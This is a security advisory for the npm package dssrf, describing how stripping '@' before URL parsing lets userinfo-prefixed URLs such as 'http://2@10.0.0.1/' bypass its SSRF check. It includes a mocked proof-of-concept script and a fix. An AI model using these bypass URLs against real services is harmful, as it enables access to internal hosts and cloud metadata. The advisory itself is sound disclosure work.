# [H] dssrf has an SSRF bypass with remove_at_symbol_in_string

## Summary
Severity: High
Advisory: GHSA-cg4g-m8jx-vjv2
CVE: CVE-2026-54722
CWE: CWE-76
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-30
Source: https://github.com/advisories/GHSA-cg4g-m8jx-vjv2
Type: github-advisory

## Affected
- npm: `dssrf` — affected >=0 <1.0.4

## Details
## Summary

`is_url_safe` in v1.0.3 contains an SSRF bypass. `remove_at_symbol_in_string` is applied to the raw URL string **before** `new URL()` parses it. This strips the `@` that separates userinfo from host, corrupting the hostname so internal IPs are never checked.

## Vulnerability

In `helpers.ts`, `is_url_safe` does:

```ts
u = remove_at_symbol_in_string(u);   // strips ALL '@' from the raw string
// ...
const parsed = new URL(u);
const hostname = parsed.hostname;    // resolved from the corrupted string
```

### What happens step by step

Input: `http://evil.com@127.0.0.1/`

1. `remove_at_symbol_in_string` → `http://evil.com127.0.0.1/`
2. `new URL(...)` → `hostname = "evil.com127.0.0.1"`
3. Not a bare IP, not IPv6 → passes all IP checks
4. `is_hostname_resolve_to_internal_ip("evil.com127.0.0.1")` → NXDOMAIN → returns false
5. **Result: `true` (safe)** — but any HTTP client using the *original* URL connects to `127.0.0.1`

### Proof of Concept

```js
import nock from 'nock';
import { got } from 'got';
import { is_url_safe } from 'dssrf';

// Simulate an internal server at 10.0.0.1 that returns secret data
nock('http://10.0.0.1:80').persist().get('/').reply(200, 'SECRET_DATA');

const BYPASS_URL = 'http://2@10.0.0.1/';
const PLAIN_URL  = 'http://10.0.0.1/';

// dssrf should block both — it only blocks the plain one
console.log('--- dssrf validator ---');
console.log(`is_url_safe('${PLAIN_URL}')   =`, await is_url_safe(PLAIN_URL),  '← correctly blocked');
console.log(`is_url_safe('${BYPASS_URL}') =`, await is_url_safe(BYPASS_URL), '← ⚠️  BYPASSED (should be false)');

// HTTP client with the bypass URL — gets SECRET_DATA back from 10.0.0.1
console.log('\n--- HTTP client ---');
try {
  const res = await got(BYPASS_URL, { retry: { limit: 0 } });
  console.log(`got('${BYPASS_URL}') response:`, res.body, '← ⚠️  VULNERABLE');
} catch (e) {
  console.log(`got('${BYPASS_URL}') blocked:`, e.message);
}
```

## Root Cause

`@` in a URL separates `userinfo` (credentials) from `host`. Stripping it from the raw string before parsing destroys that boundary. The fix is to **reject any URL that contains a userinfo component** after parsing.

## Suggested Fix

Remove the `remove_at_symbol_in_string` call from `is_url_safe` and add a userinfo check after `new URL()`:

```ts
const parsed = new URL(u);

// Reject userinfo — '@' in authority is a classic SSRF bypass vector
if (parsed.username !== "" || parsed.password !== "") {
  return false;
}
```

A working patch verified against 15 vectors (all internal IPv4 ranges, IMDS, IPv6 via userinfo, and legitimate public URLs) is ready to submit as a PR.

## Impact

- **Affected version**: 1.0.3 (latest)
- **Bypasses**: all internal IPv4 ranges, IPv6 loopback/ULA/link-local, AWS IMDS (`169.254.169.254`), any internal hostname via userinfo prefix
- **Note**: The GHSA-8p33-q827-ghj5 advisory patched version (`1.0.3`) should be updated since this vector was not covered by that fix


Users are strongly advised to upgrade to dssrf 1.0.4

## References
- https://github.com/HackingRepo/dssrf-js/security/advisories/GHSA-cg4g-m8jx-vjv2
- https://nvd.nist.gov/vuln/detail/CVE-2026-54722
- https://github.com/HackingRepo/dssrf-js/issues/97
- https://github.com/HackingRepo/dssrf-js/pull/98
- https://github.com/HackingRepo/dssrf-js/commit/9211f91bf532433a1a1b27d946571546a63664b3
- https://github.com/HackingRepo/dssrf-js
